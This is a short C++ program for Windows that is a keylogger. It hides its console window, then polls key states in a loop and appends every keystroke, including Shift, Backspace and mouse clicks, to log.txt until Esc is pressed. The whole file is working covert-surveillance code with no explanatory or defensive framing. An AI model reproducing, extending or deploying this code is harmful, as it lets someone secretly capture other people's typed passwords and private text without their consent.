#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void StartLog();

int main(){
    ShowWindow(GetConsoleWindow(),SW_HIDE);
    StartLog();
    return 0;
}

void StartLog(){
    char c;
    int i=0;
    while(i<1){
        for(c=0;c<=254;c++) {
            if(GetAsyncKeyState(c)& 0x1){
                 ofstream log;
                log.open("log.txt",ios::app);
                switch(c){
                    case VK_BACK:
                        log<<"[Backspace]";
                        break;
                    case VK_SHIFT:
                        log<<"[Shift]";
                        break;
                    case VK_CONTROL:
                        log<<"[Control]";
                        break;
                    case VK_UP:
                        log<<"[Up]";
                        break;
                    case VK_DOWN:
                        log<<"[Down]";
                        break;
                    case VK_LBUTTON:
                        log<<"[LeftB]";
                        break;
                    case VK_RBUTTON:
                        log<<"[RightB]";
                        break;
                    case VK_CAPITAL:
                        log<<"[Caps]";
                        break;
                    case VK_TAB:
                        log<<"[Tab]";
                        break;
                    case VK_ESCAPE:
                        log<<"[Esc]";
                        log.close();
                        return;
                        break;
                    default:
                        log<<c;
                        break;
                }
                log.close();//iam trying
            }
        }
    }
}